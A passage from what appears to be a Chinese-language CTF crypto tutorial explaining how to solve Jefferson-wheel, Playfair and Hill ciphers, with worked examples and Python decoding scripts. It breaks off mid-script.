ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">steady_content=re.findall(<span class="string">r&#x27;&lt;(.*?)&lt;&#x27;</span>,steady_str)</span><br><span class="line">steady_vi=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</span><br><span class="line">steady_m=<span class="string">&quot;NFQKSEVOQOFNP&quot;</span></span><br><span class="line">steady_new_content=[]</span><br><span class="line">steady_new_content2=[<span class="literal">None</span> <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">13</span>)]</span><br><span class="line">steady_vi2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_vi)):</span><br><span class="line">    steady_move=steady_vi[i]</span><br><span class="line">    steady_new_content.append(steady_content[steady_move<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(steady_new_content)):</span><br><span class="line">    steady_vi2.append(steady_new_content[j].index(steady_m[j]))</span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> enumerate(steady_new_content):</span><br><span class="line">    steady_new_content2[x]=re.sub(<span class="string">r&quot;  &quot;</span>,<span class="string">&quot;&quot;</span>,y[steady_vi2[x]:]+y[:steady_vi2[x]])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        steady_flag+=steady_new_content2[j][i]</span><br><span class="line">    print(steady_flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mtable = <span class="string">&quot;&quot;&quot;1:&lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span></span><br><span class="line"><span class="string">2:&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span></span><br><span class="line"><span class="string">3:&lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span></span><br><span class="line"><span class="string">4:&lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span></span><br><span class="line"><span class="string">5:&lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span></span><br><span class="line"><span class="string">6:&lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span></span><br><span class="line"><span class="string">7:&lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span></span><br><span class="line"><span class="string">8:&lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span></span><br><span class="line"><span class="string">9:&lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span></span><br><span class="line"><span class="string">10:&lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span></span><br><span class="line"><span class="string">11：&lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span></span><br><span class="line"><span class="string">12：&lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span></span><br><span class="line"><span class="string">13：&lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&quot;&quot;&quot;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">m = [<span class="string">&quot;&quot;</span>] * <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> mtable[i]:</span><br><span class="line">        <span class="keyword">if</span> str.isalpha(y):</span><br><span class="line">            m[i] += y</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>]</span><br><span class="line">message = <span class="string">&quot;NFQKSEVOQOFNP&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    x = key[i] - <span class="number">1</span> <span class="comment"># key[i] - 1</span></span><br><span class="line">    <span class="keyword">while</span> m[x][<span class="number">0</span>] != message[i]:</span><br><span class="line">        m[x] = m[x][<span class="number">1</span>:] + m[x][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        print(m[key[j] - <span class="number">1</span>][i].lower(), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h2><p>密钥生成</p><p>选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将I和J视作同一字。）</p><p>数据加密</p><p>将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。最后不足两位也补X或者Q。</p><p>1、若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。</p><p>2、若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。</p><p>3、若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。</p><p>数据解密</p><p>1、若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。</p><p>2、若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。</p><p>3、若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。</p><p>比如：</p><p>密钥crazy dog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p l a y f</span><br><span class="line"></span><br><span class="line">i r b c d</span><br><span class="line"></span><br><span class="line">e g h j k</span><br><span class="line"></span><br><span class="line">m n o q s</span><br><span class="line"></span><br><span class="line">t u v w x</span><br></pre></td></tr></table></figure><p>明文：where there is life,there is hope.</p><p>分组：wh er et he re is li fe th er ei sh op e</p><p>加密：KU YO XD OL OY PL FK DL FU YO LG LN NG LY</p><p>解密：where there is life,there is hope</p><p>python解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;密文&#39;).decipher(&#39;密钥&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).decipher(&#39;CGOCPMOFEBMLUNISEOZY&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>密钥：playfair。<br>密文：Dncnoqqfliqrpgeklwmppu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwxz&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>密钥：shiyanb</p><p>密文：KQSAMFPAOPMFPA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;shiyanbcdefgjklmopqrtuvwx&#39;).decipher(&#39;KQSAMFPAOPMFPA&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>我们在密钥生成的时候遵循将I和J视作同一字的原则，所以如果密钥中出现i或者j，就不能出现i或者j。第一个题我们是i和j都不出现，第二个题我们只出现了j，所以有些题还是要视情况而定。</p><h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><p>原理：</p><p>希尔密码是运用基本矩阵论原理的替换密码。每个字母当作26进制数字：A=0，B=1…一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD 26。注意用作加密的矩阵（即密钥）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。</p><p>例如：设分组长度n=2，密钥为：K={7,9；8,3}，明文为：friday</p><p>加密过程为：</p><p>（1）将明文分为两两一组（因为n=2）：fr,id,ay</p><p>（2）将明文字母转换为对应的明文编码：（5,17），（8,3），（0,24）</p><p>（3）分别计算每一组明文对应的密文编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（5,17）*K mod 26 &#x3D;（15,16）</span><br><span class="line">（8,3） *K mod 26&#x3D;（2,5）</span><br><span class="line">（0,24） *K mod 26&#x3D;（10,20）</span><br></pre></td></tr></table></figure><p>（4）将密文编码转换为对应的密文字母，即pq，cf，ku</p><p>解密过程为：</p><p>（1）将密文分为两两一组：pq，cf，ku</p><p>（2）将密文字母转换为对应的编码：（15,16），（2,5），（10,20）</p><p>（3）分别计算每一组密文对应的明文编码（K-1位K的逆矩阵）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（15,16）*K-1 mod 26 &#x3D;（5,17）</span><br><span class="line">（2,5） *K -1mod 26&#x3D;（8,3）</span><br><span class="line">（10,20） *K-1 mod 26&#x3D;（0,24）</span><br></pre></td></tr></table></figure><p>（4）将明文编码转换为明文字母，完成解密。</p><p>前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、密文</span><br><span class="line"></span><br><span class="line">2、矩阵（也叫解密矩阵）</span><br></pre></td></tr></table></figure><p>步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、根据矩阵，求出逆矩阵。</span><br><span class="line"></span><br><span class="line">2、逆矩阵与密文对应的矩阵相乘。（一定要注意写密文矩阵的顺序）</span><br><span class="line"></span><br><span class="line">3、得到矩阵b,每一个数与26相余。</span><br><span class="line"></span><br><span class="line">4.得到的余数转ascii</span><br></pre></td></tr></table></figure><p>例子：</p><p>密文：dloguszijluswogany</p><p>矩阵：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line"></span><br><span class="line">0 1</span><br></pre></td></tr></table></figure><ul><li><p>求逆矩阵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from numpy import *</span><br><span class="line">a3&#x3D;mat([[1,2],[0,1]])</span><br><span class="line">print(a3)</span><br><span class="line">a4&#x3D;a3.I</span><br><span class="line">print(a4)</span><br><span class="line"></span><br><span class="line">[[ 1. -2.]</span><br><span class="line"> [ 0.  1.]]</span><br></pre></td></tr></table></figure></li><li><p>密文转化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d     l     o     g     u     s     z     i     j     l     u     s     w     o     g     a     n     y</span><br><span class="line">4    12     15    7     21    19    26    9     10    12    21    19    23    15    7     1    14    25</span><br></pre></td></tr></table></figure></li><li><p>逆矩阵与密文矩阵相乘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">a=mat([[<span class="number">1</span>,<span class="number">-2</span>],[<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line">b=mat([[<span class="number">4</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">26</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">14</span>],[<span class="number">12</span>,<span class="number">7</span>,<span class="number">19</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">19</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">25</span>]])</span><br><span class="line">c=a*b</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></li><li><p>矩阵mod26</p><p>拿到flag</p></li><li><p>求最小公倍数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bei</span>(<span class="params">num1,num2</span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,(num1 * num2)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % num1 == <span class="number">0</span> <span class="keyword">and</span> i % num2 == <span class="number">0</span>:</span><br><span class="line">            b.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> b[<span class="number">0</span>]</span><br><span class="line">num1=int(input())</span><br><span class="line">num2=int(input())</span><br><span class="line">print(bei(num1, num2))</span><br></pre></td></tr></table></figure></li></ul><p>如果逆矩阵得到了分数。出现分数项则 *最小公倍数(27,|D|)  |D|为行列式的值。</p><p>求行列式的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MatrixGetDet</span>(<span class="params">M</span>):</span></span><br><span class="line">    length = len(M)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> M[<span class="number">0</span>][<span class="number">0</span>]*M[<span class="number">1</span>][<span class="number">1</span>] - M[<span class="number">0</span>][<span class="number">1</span>]*M[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">import</span> itertools</span><br><span class="line">    <span class="comment"># sum positive</span></span><br><span class="line">    positive = <span class="number">0</span></span><br><span class="line">    indexer1 = itertools.cycle(range(length))</span><br><span class="line">    indexer2 = itertools.cycle(range(length))</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">        indexer1.next()</span><br><span class="line">        _tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">            index1 = indexer1.next()</span><br><span class="line">            index2 = indexer2.next()</span><br><span class="line">            _tmp *= M[index1][index2]</span><br><span class="line">        positive += _tmp</span><br><span class="line">    <span class="comment"># sum negative</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    indexer1 = itertools.cycle(range(length))</span><br><span class="line">    indexer2 = itertools.cycle(range(length)[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">        indexer1.next()</span><br><span class="line">        _tmp = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(length):</span><br><span class="line">            index1 = indexer1.next()</span><br><span class="line">            index2 = indexer2.next()</span><br><span class="line">            _tmp *= M[index1][index2]</span><br><span class="line">        negative += _tmp</span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    <span class="keyword">return</span> positive - negative</span><br><span class="line">matrix1 = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> MatrixGetDet(matrix1)</span><br></pre></td></tr></table></figure><p>最终脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">dis=&#123;<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;b&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;c&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;d&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;e&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;f&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;g&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;h&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;i&#x27;</span>,<span class="number">10</span>:<span class="string">&#x27;j&#x27;</span>,<span class="number">11</span>:<span class="string">&#x27;k&#x27;</span>,<span class="number">12</span>:<span class="string">&#x27;l&#x27;</span>,<span class="number">13</span>:<span class="string">&#x27;m&#x27;</span>,<span class="number">14</span>:<span class="string">&#x27;n&#x27;</span>,<span class="number">15</span>:<span class="string">&#x27;o&#x27;</span>,<span class="number">16</span>:<span class="string">&#x27;p&#x27;</span>,<span class="number">17</span>:<span class="string">&#x27;q&#x27;</span>,<span class="number">18</span>:<span class="string">&#x27;r&#x27;</span>,<span class="number">19</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">20</span>:<span class="string">&#x27;t&#x27;</span>,<span class="number">21</span>:<span class="string">&#x27;u&#x27;</span>,<span class="number">22</span>:<span class="string">&#x27;v&#x27;</span>,<span class="number">23</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">24</span>:<span class="string">&#x27;x&#x27;</span>,<span class="number">25</span>:<span class="string">&#x27;y&#x27;</span>,<span class="number">26</span>:<span class="string">&#x27;z&#x27;</span>&#125;</span><br><span class="line">f=mat([[<span class="number">8</span>,<span class="number">16</span>,<span class="number">27</span>],[<span class="number">8</span>,<span class="number">99</span>,<span class="number">24</span>],[<span class="number">27</span>,<span class="number">24</span>,<span class="number">27</span>]])</span><br><span class="line">e=mat([[<span class="number">22</span>,<span class="number">9</span>,<span class="number">0</span>],[<span class="number">12</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">10</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">8</span>,<span class="number">1</span>,<span class="number">17</span>]])</span><br><span class="line">g=e*f</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        k=(g[i][j])%<span class="number">26</span>+<span class="number">1</span></span><br><span class="line">        l=dis[k]</span><br><span class="line">        flag+=l</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Start</span>():</span></span><br><span class="line"></span><br><span class="line">opt = OptionParser()</span><br><span class="line"></span><br><span class="line">opt.add_option(<span class="string">&#x27;-k&#x27;</span>,dest=<span class="string">&#x27;key&#x27;</span>,help=<span class="string">&quot;Input your matrix&quot;</span>)</span><br><span class="line"></span><br><span class="line">opt.add_option(<span class="string">&#x27;-p&#x27;</span>,dest=<span class="string">&#x27;pw&#x27;</span>,help=<span class="string">&quot;Input your passwd&quot;</span>)</span><br><span class="line"></span><br><span class="line">options,args = opt.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> options.pw <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> options.key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Use \&#x27;-h\&#x27; to get help&#x27;</span></span><br><span class="line"></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> options</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ForKey</span>(<span class="params">key</span>):</span></span><br><span class="line"></span><br><span class="line">key = mat(key)</span><br><span class="line"></span><br><span class="line">key = key.I.T</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;key is :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ForPw</span>(<span class="params">pw,lenght</span>):</span></span><br><span class="line"></span><br><span class="line">result = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pw)/lenght)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pw)/lenght):</span><br><span class="line"></span><br><span class="line">string = pw[i*lenght:(i+<span class="number">1</span>)*lenght]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.isalpha():</span><br><span class="line"></span><br><span class="line">s = ord(s) - <span class="number">96</span></span><br><span class="line"></span><br><span class="line">result[i].append(s)</span><br><span class="line"></span><br><span class="line">result = mat(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;password matrix is:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Deal</span>(<span class="params">start</span>):</span></span><br><span class="line"></span><br><span class="line">key = start.key</span><br><span class="line"></span><br><span class="line">pw = start.pw</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pw.isalpha():</span><br><span class="line"></span><br><span class="line">judge = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">key = ForKey(key)</span><br><span class="line"></span><br><span class="line">result = ForPw(pw,len(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> key,result,judge</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">key,result,judge</span>):</span></span><br><span class="line"></span><br><span class="line">get = result * key</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The result matrix is:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line">get = 